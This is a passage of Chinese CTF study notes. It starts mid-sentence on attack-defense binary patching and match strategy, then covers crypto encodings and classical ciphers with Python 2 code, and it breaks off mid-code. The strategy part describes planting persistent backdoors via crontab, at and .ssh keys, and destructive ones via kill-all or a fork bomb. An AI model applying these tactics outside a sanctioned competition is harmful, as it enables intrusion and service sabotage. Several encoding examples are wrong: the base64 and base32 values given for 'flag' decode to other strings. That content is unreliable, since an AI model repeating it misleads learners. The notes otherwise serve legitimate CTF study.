printf）替换为安全函数（如 puts），需计算新地址并修改指令，通过实例展示了具体步骤。</li><li><strong>.eh_frame 段 Patch 法</strong>：在.eh_frame 段编写代码处理 uaf 等风险，如清零释放后的指针，再跳转回原逻辑，保证不影响相关操作。</li><li><strong>其他方法</strong>：可利用 lief、patchkit 等工具进行半自动 Patch 操作。</li></ol><h3 id="（二）攻防策略"><a href="#（二）攻防策略" class="headerlink" title="（二）攻防策略"></a>（二）攻防策略</h3><ol><li><strong>服务上下线策略</strong>：根据赛场上 flag 提交情况决定服务上线或下线。若自己战队排名靠前且只有少数战队拿走 flag，可下线减少后门和清理工作；若大面积服务宕掉，在保证自身服务稳定的情况下上线获取分数；若想获取 exp 流量或提示流量也应上线。</li><li><strong>后门植入策略</strong>：分为持久性后门（如通过 crontab、at 等设置或写.ssh）和破坏性后门（如使用 kill all 或 fork bang 使服务宕掉）。</li><li><strong>后门清理策略</strong>：Web 题目在题目权限和 CTF 权限清理，二进制题目可 su 到题目权限后 kill all，并清理 crontab 和 at 等位置。</li><li><strong>流量策略</strong>：选手会获取攻击流量和提示流量，通过分析流量定位 exp，可对流量混淆，根据流量情况修补二进制文件和复现 exp，还可发现后门问题。</li><li><strong>强弱者策略</strong>：强队注重漏洞挖掘利用，弱队应紧盯强队动作，快速进行 Patch 操作和复现，可通过脚本自动化流量抓取分析、后门管理和 exp 管理等工作。</li></ol><h1 id="Crypto笔记"><a href="#Crypto笔记" class="headerlink" title="Crypto笔记"></a>Crypto笔记</h1><h2 id="一、Crypto概述"><a href="#一、Crypto概述" class="headerlink" title="一、Crypto概述"></a>一、Crypto概述</h2><ul><li><strong>题目特点与趋势</strong>：在CTF中，Crypto题目专注于密码学知识考查，线上赛常见且难度较高，线下赛多与其他类型结合。近年与PWN、Reverse融合，趋于前沿化、论文化。</li><li><strong>能力要求</strong>：参赛者需具备扎实数学功底（尤其是数论），还应拥有识别密码算法、攻击特定算法、分析未知算法、编程实现破解、快速学习新方法和掌握跨领域知识等能力。</li><li><strong>解题困难及应对</strong>：解题困难通常源于不熟悉算法破解方法或时间不足。对于前者，应深入学习常见算法及其攻击方式；对于后者，若确定算法思路正确，可借助编程和高性能计算机解题。</li><li><strong>潜力选手类型及发展方向</strong>：数学专业学生需提升编程能力；编程能力强的选手要加强数学基础和密码学知识学习，两者都有望成为优秀CTF选手。</li><li><strong>密码学分类与攻击类型</strong>：分为古典密码学和现代密码学。攻击类型有唯密文攻击、已知明文攻击、选择明文攻击、选择密文攻击。</li></ul><h2 id="二、编码"><a href="#二、编码" class="headerlink" title="二、编码"></a>二、编码</h2><h3 id="（一）hex编码"><a href="#（一）hex编码" class="headerlink" title="（一）hex编码"></a>（一）hex编码</h3><ul><li><strong>原理与应用</strong>：将信息转换为十六进制，便于处理特殊字符传输和进行数学计算。在Python中，通过 <code>encode(&quot;hex&quot;)</code> 实现编码，<code>int(t, 16)</code> 可转换为十进制进行运算，<code>hex(num)</code> 则用于将数字转回十六进制字符串，还可自定义函数处理转换中的细节问题。同时，PyCrypto库的 <code>long_to_bytes</code> 和 <code>bytes_to_long</code> 函数也能方便地进行相关转换。</li><li><strong>示例代码与结果分析</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s.encode(<span class="string">&quot;hex&quot;</span>))  <span class="comment"># 输出: 666c6167</span></span><br><span class="line"></span><br><span class="line">t = s.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(t, <span class="number">16</span>))  <span class="comment"># 输出: 1718378855</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">584734024210391580014049650557280915516226103165</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(num))  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(num)[<span class="number">2</span>:-<span class="number">1</span>])  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(num)[<span class="number">2</span>:-<span class="number">1</span>].decode(<span class="string">&quot;hex&quot;</span>))  </span><br></pre></td></tr></table></figure></li></ul><h3 id="（二）urlencode编码"><a href="#（二）urlencode编码" class="headerlink" title="（二）urlencode编码"></a>（二）urlencode编码</h3><ul><li><strong>编码规则与用途</strong>：用于解决浏览器与网站间特殊字符传输问题，在特殊字符hex基础上，每个字符前置 “%”。例如，<code>flag&#123;url_encode_1234_!@#$&#125;</code> 编码后为 <code>flag%7Burl_encode_1234_%21@%23%24%7D</code>。</li><li><strong>Python实现</strong>：在Python中，使用 <code>urllib</code> 库的 <code>quote</code> 函数对字符串编码，<code>urlencode</code> 函数可对字典模式键值对编码，<code>unquote</code> 函数用于解码。</li><li><strong>示例代码与结果</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(<span class="string">&quot;flag&#123;url_encode_1234_!@#$&#125;&quot;</span>))  </span><br><span class="line">d = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;bibi@flappypig.club&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;flag&#123;url_encode_1234_!@#$&#125;&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(urllib.urlencode(d))  </span><br></pre></td></tr></table></figure></li></ul><h3 id="（三）morsecode编码"><a href="#（三）morsecode编码" class="headerlink" title="（三）morsecode编码"></a>（三）morsecode编码</h3><ul><li><strong>编码特点与识别</strong>：由长音和短音构成，无密钥，常用于信息传输。例如，<code>..-./.-../.-/--./--/---/.-./.../.</code> 解码为 <code>FLAGMORSE</code>。</li><li><strong>解码工具与Python实现</strong>：有许多在线解码工具，如 <code>http://www.atool.org/morse.php</code> 等。在Python中，通过定义字母与摩斯码的对应字典，编写编码和解码函数实现转换。</li><li><strong>示例代码（部分关键函数）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">alphabet_to_morse = &#123;</span><br><span class="line">    <span class="string">&quot;A&quot;</span>: <span class="string">&quot;.-&quot;</span>, <span class="string">&quot;B&quot;</span>: <span class="string">&quot;-...&quot;</span>, <span class="string">&quot;C&quot;</span>: <span class="string">&quot;-.-.&quot;</span>, <span class="string">&quot;D&quot;</span>: <span class="string">&quot;-..&quot;</span>, <span class="string">&quot;E&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;F&quot;</span>: <span class="string">&quot;..-.&quot;</span>, <span class="string">&quot;G&quot;</span>: <span class="string">&quot;--.&quot;</span>, <span class="string">&quot;H&quot;</span>: <span class="string">&quot;....&quot;</span>, <span class="string">&quot;I&quot;</span>: <span class="string">&quot;..&quot;</span>, <span class="string">&quot;J&quot;</span>: <span class="string">&quot;.---&quot;</span>, <span class="string">&quot;K&quot;</span>: <span class="string">&quot;-.-&quot;</span>, <span class="string">&quot;L&quot;</span>: <span class="string">&quot;.-..&quot;</span>, <span class="string">&quot;M&quot;</span>: <span class="string">&quot;--&quot;</span>, <span class="string">&quot;N&quot;</span>: <span class="string">&quot;-.&quot;</span>, <span class="string">&quot;O&quot;</span>: <span class="string">&quot;---&quot;</span>, <span class="string">&quot;P&quot;</span>: <span class="string">&quot;.--.&quot;</span>, <span class="string">&quot;Q&quot;</span>: <span class="string">&quot;--.-&quot;</span>, <span class="string">&quot;R&quot;</span>: <span class="string">&quot;.-.&quot;</span>, <span class="string">&quot;S&quot;</span>: <span class="string">&quot;...&quot;</span>, <span class="string">&quot;T&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;U&quot;</span>: <span class="string">&quot;..-&quot;</span>, <span class="string">&quot;V&quot;</span>: <span class="string">&quot;...-&quot;</span>, <span class="string">&quot;W&quot;</span>: <span class="string">&quot;.--&quot;</span>, <span class="string">&quot;X&quot;</span>: <span class="string">&quot;-..-&quot;</span>, <span class="string">&quot;Y&quot;</span>: <span class="string">&quot;-.--&quot;</span>, <span class="string">&quot;Z&quot;</span>: <span class="string">&quot;--..&quot;</span>, <span class="string">&quot;0&quot;</span>: <span class="string">&quot;-----&quot;</span>, <span class="string">&quot;1&quot;</span>: <span class="string">&quot;.----&quot;</span>, <span class="string">&quot;2&quot;</span>: <span class="string">&quot;..---&quot;</span>, <span class="string">&quot;3&quot;</span>: <span class="string">&quot;...--&quot;</span>, <span class="string">&quot;4&quot;</span>: <span class="string">&quot;....-&quot;</span>, <span class="string">&quot;5&quot;</span>: <span class="string">&quot;.....&quot;</span>, <span class="string">&quot;6&quot;</span>: <span class="string">&quot;-....&quot;</span>, <span class="string">&quot;7&quot;</span>: <span class="string">&quot;--...&quot;</span>, <span class="string">&quot;8&quot;</span>: <span class="string">&quot;---..&quot;</span>, <span class="string">&quot;9&quot;</span>: <span class="string">&quot;----.&quot;</span>, <span class="string">&quot;,&quot;</span>: <span class="string">&quot;--..--&quot;</span>, <span class="string">&quot;:&quot;</span>: <span class="string">&quot;---...&quot;</span>, <span class="string">&quot;;&quot;</span>: <span class="string">&quot;-.-.-.&quot;</span>, <span class="string">&quot;?&quot;</span>: <span class="string">&quot;..--..&quot;</span>, <span class="string">&quot;-&quot;</span>: <span class="string">&quot;-....-&quot;</span>, <span class="string">&quot;_&quot;</span>: <span class="string">&quot;..--.-&quot;</span>, <span class="string">&quot;(&quot;</span>: <span class="string">&quot;-.--.&quot;</span>, <span class="string">&quot;)&quot;</span>: <span class="string">&quot;-.--.-&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&quot;.----.&quot;</span>, <span class="string">&quot;=&quot;</span>: <span class="string">&quot;-...-&quot;</span>, <span class="string">&quot;+&quot;</span>: <span class="string">&quot;.-.-.&quot;</span>, <span class="string">&quot;/&quot;</span>: <span class="string">&quot;-..-.&quot;</span>, <span class="string">&quot;@&quot;</span>: <span class="string">&quot;.--.-.&quot;</span>, <span class="string">&quot;&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">morse_to_alphabet = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> alphabet_to_morse.iteritems()&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">morsedecode</span>(<span class="params">encoded</span>):</span><br><span class="line">    characterstring = []</span><br><span class="line">    words = encoded.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">        letters = word.split(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">        characterword = []</span><br><span class="line">        <span class="keyword">for</span> letter <span class="keyword">in</span> letters:</span><br><span class="line">            characterletter = morse_to_alphabet[letter]</span><br><span class="line">            characterword.append(characterletter)</span><br><span class="line">        word = <span class="string">&quot;&quot;</span>.join(characterword)</span><br><span class="line">        characterstring.append(word)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(characterstring)</span><br></pre></td></tr></table></figure></li></ul><h3 id="（四）jsfuck编码"><a href="#（四）jsfuck编码" class="headerlink" title="（四）jsfuck编码"></a>（四）jsfuck编码</h3><ul><li><strong>编码特性与示例</strong>：仅用 <code>()+[]!</code> 6 个字符书写 JavaScript 代码，如 <code>alert(1)</code> 编码后变得复杂。</li><li><strong>解码方法</strong>：可使用在线解码网站，如 <code>http://www.jsfuck.com</code>、<code>http://utf-8.jp/public/jsfuck.html</code>。</li></ul><h3 id="（五）uuencode编码"><a href="#（五）uuencode编码" class="headerlink" title="（五）uuencode编码"></a>（五）uuencode编码</h3><ul><li><strong>原理与特点</strong>：将二进制文件转换为可见字符文本，每 3 字节扩展成 4 字节，编码后字符取值 32 - 95，无小写字母，易于识别。例如，<code>flag&#123;uuencode&#125;</code> 编码后为 <code>.9FQA9WMU=65N8V]D97T</code>。</li><li><strong>在线工具</strong>：可通过 <code>http://www.qqxiuzi.cn/bianma/uuencode.php</code> 进行编解码。</li></ul><h3 id="（六）base家族编码"><a href="#（六）base家族编码" class="headerlink" title="（六）base家族编码"></a>（六）base家族编码</h3><ul><li><strong>编码功能与常见类型</strong>：包括 base64、base32、base16（即 hex）等，主要用于转换特殊字符和不可见字符为常见字符，便于网络传输。</li><li><strong>识别方法</strong>：看是否有 “=” 结尾，或检查编码字符是否在对应字符集上。例如，<code>flag</code> 的 base16 编码为 <code>666c6167</code>，base32 编码为 <code>MZXW6YTBOI====</code>，base64 编码为 <code>ZmFsbw==</code>。</li><li><strong>Python编解码</strong>：base64 可直接用字符串 <code>encode</code> 和 <code>decode</code> 方法，base32 和 base16 需用 <code>base64</code> 库函数。</li><li><strong>base64编码原理示例</strong>：以 <code>AST</code> 为例，字符转换为数字 65、83、84，二进制表示共 24bit，6bit 一组切分转换为十进制后查表得到编码字符。在 CTF 题目中，可能会遇到私有 base64，需替换自定义表进行解码。</li></ul><h2 id="三、古典密码"><a href="#三、古典密码" class="headerlink" title="三、古典密码"></a>三、古典密码</h2><h3 id="（一）移位密码"><a href="#（一）移位密码" class="headerlink" title="（一）移位密码"></a>（一）移位密码</h3><h4 id="1-简单移位密码"><a href="#1-简单移位密码" class="headerlink" title="1. 简单移位密码"></a>1. 简单移位密码</h4><ul><li><strong>加密原理与示例</strong>：根据密钥对明文进行位置变换。如明文 <code>flag&#123;easy_easy_crypto&#125;</code>，密钥 <code>3124</code>，按密钥长度 4 切分明文后，按密钥顺序变换每组字符位置，得到密文 <code>lafgea&#123;s_eyay_scyprt&#125;o</code>。</li><li><strong>Python实现（加密与解密）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shift_encrypt</span>(<span class="params">m, k</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(k)</span><br><span class="line">    c = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(m), l):</span><br><span class="line">        tmp_c = [<span class="string">&quot;&quot;</span>] * l</span><br><span class="line">        <span class="keyword">if</span> i + l &gt; <span class="built_in">len</span>(m):</span><br><span class="line">            tmp_m = m[i:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp_m = m[i:i + l]</span><br><span class="line">        <span class="keyword">for</span> kindex <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp_m)):</span><br><span class="line">            tmp_c[<span class="built_in">int</span>(k[kindex]) - <span class="number">1</span>] = tmp_m[kindex]</span><br><span class="line">        c += <span class="string">&quot;&quot;</span>.join(tmp_c)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_decrypt</span>(<span class="params">c, k</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(k)</span><br><span class="line">    m = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c), l):</span><br><span class="line">        tmp_m = [<span class="string">&quot;&quot;</span>] * l</span><br><span class="line">        <span class="keyword">if</span> i + l &gt;= <span class="built_in">len</span>(c):</span><br><span class="line">            tmp_c = c[i:]</span><br><span class="line">            use = []</span><br><span class="line">            <span class="keyword">for</span> kindex <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp_c)):</span><br><span class="line">                use.append(<span class="built_in">int</span>(k[kindex]) - <span class="number">1</span>)</span><br><span class="line">            use.sort()</span><br><span class="line">            <span class="keyword">for</span> kindex <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp_c)):</span><br><span class="line">                tmp_m[kindex] = tmp_c[use.index(<span class="built_in">int</span>(k[kindex]) - <span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp_c = c[i:i + l]</span><br><span class="line">            <span class="keyword">for</span> kindex <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp_c)):</span><br><span class="line">                tmp_m[kindex] = tmp_c[<span class="built_in">int</span>(k[kindex]) - <span class="number">1</span>]</span><br><span class="line">        m += <span class="string">&quot;&quot;</span>.join(tmp_m)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure></li><li><strong>攻击策略</strong>：可爆破字段长度和顺序，对于部分密文，可通过观察 flag 格式和字符位置关系直接确定密钥。</li></ul><h4 id="2-曲路密码"><a href="#2-曲路密码" class="headerlink" title="2. 曲路密码"></a>2. 曲路密码</h4><ul><li><strong>加密方式</strong>：将明文填入表中按特定曲路遍历生成密文，如明文 <code>abcdefghijklmnopqrstuvwxy</code> 按给定曲路加密后为 <code>ejotyxcnidchmrwvqlgbafkpu</code>，解密则反向遍历。</li></ul><h4 id="3-云影密码"><a href="#3-云影密码" class="headerlink" title="3. 云影密码"></a>3. 云影密码</h4><ul><li><strong>解码规则与实现</strong>：仅含 01248 五个数字，0 用于分割，其余数字求和转换为明文。在 Python 中，通过分割字符串、求和并查找对应字母实现解码。</li><li><strong>示例代码与结果</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">c01248_decode</span>(<span class="params">c</span>):</span><br><span class="line">    l = c.split(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    origin = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    r = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> i:</span><br><span class="line">            tmp += <span class="built_in">int</span>(num)</span><br><span class="line">        r += origin[tmp - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c01248_decode(<span class="string">&quot;8842101220480224404014224202480122&quot;</span>))  <span class="comment"># 输出: welldone</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="4-栅栏密码"><a href="#4-栅栏密码" class="headerlink" title="4. 栅栏密码"></a>4. 栅栏密码</h4><ul><li><strong>加密与解密过程</strong>：密钥为栅栏长度，将明文分组后按顺序取字符连接成密文。如明文 <code>flag&#123;zhalan_mima_hahaha&#125;</code>，密钥 4，加密时先分组，再依次取每组第 1、2、3、4 个字符连接。解密则是加密的逆过程。</li><li><strong>Python代码示例</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">zhalan_encrypt</span>(<span class="params">m, k</span>):</span><br><span class="line">    chip = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(m), k):</span><br><span class="line">        <span class="keyword">if</span> i + k &gt;= <span class="built_in">len</span>(m):</span><br><span class="line">            tmp_m = m[i:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp_m = m[i:i + k]</span><br><span class="line">        chip.append(tmp_m)</span><br><span class="line">    c = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        <span class="keyword">for</span> tmp_m <span class="keyword">in</span> chip:</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(tmp_m):</span><br><span class="line">                c += tmp_m[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zhalan_decrypt</span>(<span class="params">c, k</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(c)</span><br><span class="line">    partnum = l / k</span><br><span class="line">    <span class="keyword">if</span> l % k!= <span class="number">0</span>:</span><br><span class="line">        partnum += <span class="number">1</span></span><br><span class="line">    m = [<span class="string">&quot;&quot;</span>] * l</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l, partnum):</span><br><span class="line">        <span class="keyword">if</span> i + partnum &gt;= <span class="built_in">len</span>(c):</span><br><span class="line">            tmp_c = c[i:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp_c = c[i:i + partnum]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp_c)):</span><br><span class="line">            m[j * k + i / partnum] = tmp_c[j]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(m)</span><br></pre></td></tr></table></figure></li></ul><h3 id="（二）替代密码"><a href="#（二）替代密码" class="headerlink" title="（二）替代密码"></a>（二）替代密码</h3><ul><li><strong>加密原理与攻击方法</strong>：通过替换表将明文字符替换为密文字符，单表替代密码密钥为替换表，多表替代密码使用多个替换表。针对替代密码，词频分析是常用攻击方式。</li></ul><h4 id="1-凯撒密码"><a href="#1-凯撒密码" class="headerlink" title="1. 凯撒密码"></a>1. 凯撒密码</h4><ul><li><strong>加密与解密规则</strong>：通过将字母移动固定位数实现加密解密，如偏移量 3 时，<code>A</code> 变为 <code>D</code> 等。在 Python 中，通过字符编码加减偏移量并取模实现转换，可爆破密钥或利用 flag 格式判断明文。</li><li><strong>示例代码（加密与解密）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_encrypt</span>(<span class="params">m, k</span>):</span><br><span class="line">    r = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        r += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) + k) % <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">c, k</span>):</span><br><span class="line">    r = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        r += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - k) % <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-ROT13"><a href="#2-ROT13" class="headerlink" title="2. ROT13"></a>2. ROT13</h4><ul><li><strong>特点与应用</strong>：凯撒密码特殊情况，<code>k = 13</code> 且仅作用于大小写英文字母，无密钥，常用于处理特定字符串，如 <code>MD5</code>、<code>flag</code> 等。加密解密函数相同，两次加密可恢复原文。</li></ul><h4 id="3-埃特巴什码"><a href="#3-埃特巴什码" class="headerlink" title="3. 埃特巴什码"></a>3. 埃特巴什码</h4><ul><li><strong>加密原理与实现</strong>：字母表位置对称替换，在 Python 中通过查找对称位置字母实现编码解码。</li><li><strong>示例代码（编码）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">atbash_encode</span>(<span class="params">m</span>):</span><br><span class="line">    alphabet = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">    Origin = alphabet + alphabet.lower()</span><br><span class="line">    TH_A = alphabet[::-<span class="number">1</span>]</span><br><span class="line">    TH_a = alphabet.lower()[::-<span class="number">1</span>]</span><br><span class="line">    TH = TH_A + TH_a</span><br><span class="line">    r = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        tmp = Origin.find(i)</span><br><span class="line">        <span class="keyword">if</span> tmp!= -<span class="number">1</span>:</span><br><span class="line">            r += TH[tmp]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r += i</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-经典单表替代密码"><a href="#4-经典单表替代密码" class="headerlink" title="4. 经典单表替代密码"></a>4. 经典单表替代密码</h4><ul><li><strong>加密与解密操作</strong>：用给定替代表对明文字符逐一替换，无替代表时爆破难度高，可利用词频统计攻击，有替代表则按对应关系解密。</li><li><strong>示例代码（加密）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">substitution_encode</span>(<span class="params">m, k, origin=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span>):</span><br><span class="line">    r = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        <span class="keyword">if</span> origin.find(i)!=-<span class="number">1</span>:</span><br><span class="line">            r += k[origin.find(i)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r += i</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure></li></ul><h4 id="5-培根密码"><a href="#5-培根密码" class="headerlink" title="5. 培根密码"></a>5. 培根密码</h4><ul><li><strong>编码特点与解码工具</strong>：用两种字体表示密文，五个一组，关键是字体，可通过 <code>http://rumkin.com/tools/cipher/baconian.php</code> 在线解码。</li></ul><h4 id="6-图形替代密码"><a href="#6-图形替代密码" class="headerlink" title="6. 图形替代密码"></a>6. 图形替代密码</h4><ul><li><strong>猪圈密码与跳舞的小人密码</strong>：猪圈密码用不同格子表示字母，跳舞的小人密码用小人图案表示字母，均通过图形替代明文，可查找对应表进行解密。</li></ul><h4 id="7-仿射密码"><a href="#7-仿射密码" class="headerlink" title="7. 仿射密码"></a>7. 仿射密码</h4><ul><li><strong>加密替代表生成与示例</strong>：替代表依据 <code>c = am + b mod n</code> 生成，加密时按公式计算，解密需先求 <code>a</code> 关于 <code>n</code> 的逆元。可爆破、词频统计或利用已知明密文对推理密钥，在 Python 中按公式编写加密解密函数。</li><li><strong>示例代码（加密）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">affine_encode</span>(<span class="params">m, a, b, origin=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span>):</span><br><span class="line">    r = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        <span class="keyword">if</span> origin.find(i)!=-<span 